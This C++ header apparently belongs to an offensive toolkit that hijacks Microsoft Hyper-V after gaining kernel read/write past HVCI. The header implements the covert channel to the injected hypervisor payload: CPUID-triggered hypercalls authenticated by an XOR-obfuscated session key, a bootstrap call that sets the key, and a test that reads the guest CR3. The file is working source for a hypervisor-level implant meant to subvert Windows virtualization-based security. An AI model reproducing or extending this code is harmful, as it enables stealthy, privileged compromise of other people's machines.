#pragma once

// Phase 3.1: Hypercall Verification
// After ZeroHVCI obtains kernel R/W and RuntimeHijacker injects payload into Hyper-V,
// verify the hypercall communication channel works by setting auth key and testing CR3 read.

#include "../../OmbraShared/communication.hpp"
#include <Windows.h>
#include <cstdint>
#include <intrin.h>

namespace zerohvci {
namespace hypercall {

// External assembly hypercall function
// Implemented in separate .asm file since MSVC x64 doesn't support inline assembly
// Signature: VMX_ROOT_ERROR hypercall_asm(u64 code, PCOMMAND_DATA param1, u64 param2, u64 key)
extern "C" VMX_ROOT_ERROR hypercall_asm(uint64_t code, PCOMMAND_DATA param1, uint64_t param2, uint64_t key);

// Assembly hypercall wrapper
// Parameters: RCX = code, RDX = param1, R8 = param2, R9 = key
// The CPUID instruction triggers a VMExit which our payload intercepts
inline VMX_ROOT_ERROR ExecuteHypercall(uint64_t code, PCOMMAND_DATA param1, uint64_t param2, uint64_t key)
{
    // CPUID-based hypercall mechanism:
    // Register convention:
    //   RCX = VMCALL_TYPE command code
    //   RDX = pointer to COMMAND_DATA
    //   R8  = optional parameter (target_cr3, etc)
    //   R9  = VMEXIT_KEY XOR 0xBABAB00E (obfuscated authentication key)
    //   RAX = VMX_ROOT_ERROR (return value after VMExit)

    // The assembly function handles:
    // 1. XOR key with 0xBABAB00E
    // 2. Save/restore RBX (callee-saved)
    // 3. Execute CPUID to trigger VMExit
    // 4. Return RAX (VMX_ROOT_ERROR)

    return hypercall_asm(code, param1, param2, key);
}

// Generate session authentication key using RDTSC for entropy
// The key is used to authenticate all subsequent hypercalls
// Without this key, the hypervisor ignores the CPUID instructions
inline uint64_t GenerateSessionKey()
{
    // Combine RDTSC (CPU timestamp counter) with current process ID
    // This provides sufficient entropy for a session key
    uint64_t rdtsc_val = __rdtsc();
    uint64_t pid = static_cast<uint64_t>(GetCurrentProcessId());

    // XOR and bit rotation for additional mixing
    uint64_t key = rdtsc_val ^ (pid << 32) ^ (pid >> 32);

    // Ensure key is non-zero (zero is invalid)
    if (key == 0) {
        key = 0xDEADBEEFDEADBEEF;
    }

    return key;
}

// Set the communication key with the hypervisor
// This MUST be the first hypercall made - it authenticates all future calls
// The payload stores this key in VMXRoot storage and validates it on each hypercall
inline bool SetCommunicationKey(uint64_t key)
{
    // VMCALL_SET_COMM_KEY uses a bootstrap - the first call has key=0
    // because we haven't set it yet. The payload allows key=0 ONLY for this command.
    VMX_ROOT_ERROR result = ExecuteHypercall(
        VMCALL_SET_COMM_KEY,
        nullptr,                    // No COMMAND_DATA needed
        key,                        // New key in R8 parameter
        0                           // Bootstrap - use 0 for first call
    );

    return result == VMX_ROOT_ERROR::SUCCESS;
}

// Test hypercall by reading current guest CR3 register
// CR3 contains the physical address of the current page directory
// If this succeeds, the hypercall channel is working
inline bool VerifyHypercallWorks(uint64_t* outCr3, uint64_t session_key)
{
    if (!outCr3) return false;

    COMMAND_DATA command = { 0 };

    VMX_ROOT_ERROR result = ExecuteHypercall(
        VMCALL_GET_CR3,
        &command,
        0,                          // No target CR3 needed
        session_key
    );

    if (result != VMX_ROOT_ERROR::SUCCESS) {
        return false;
    }

    // CR3 value is returned in command.cr3.value
    *outCr3 = command.cr3.value;

    // Sanity check: CR3 should be page-aligned (low 12 bits clear)
    if (*outCr3 == 0 || (*outCr3 & 0xFFF) != 0) {
        return false;
    }

    return true;
}

// Full verification sequence - call this after RuntimeHijacker.HijackHyperV()
// Returns the session key on success, 0 on failure
inline uint64_t VerifyHypervisorActive()
{
    // Step 1: Generate random authentication key
    uint64_t session_key = GenerateSessionKey();

    printf("[*] Generated session key: 0x%016llX\n", session_key);

    // Step 2: Set communication key with hypervisor
    printf("[*] Setting communication key with hypervisor...\n");
    if (!SetCommunicationKey(session_key)) {
        printf("[-] VMCALL_SET_COMM_KEY failed\n");
        printf("[-] Hypervisor may not be active or payload not injected\n");
        return 0;
    }

    printf("[+] Communication key set successfully\n");

    // Step 3: Verify hypercall works by reading CR3
    printf("[*] Testing hypercall with VMCALL_GET_CR3...\n");
    uint64_t cr3_value = 0;
    if (!VerifyHypercallWorks(&cr3_value, session_key)) {
        printf("[-] VMCALL_GET_CR3 failed\n");
        printf("[-] Hypercall communication not working\n");
        return 0;
    }

    printf("[+] VMCALL_GET_CR3 succeeded\n");
    printf("[+] Current CR3 (page directory base): 0x%016llX\n", cr3_value);
    printf("[+] Hypercall verification complete - communication channel active\n");

    return session_key;
}

} // namespace hypercall
} // namespace zerohvci
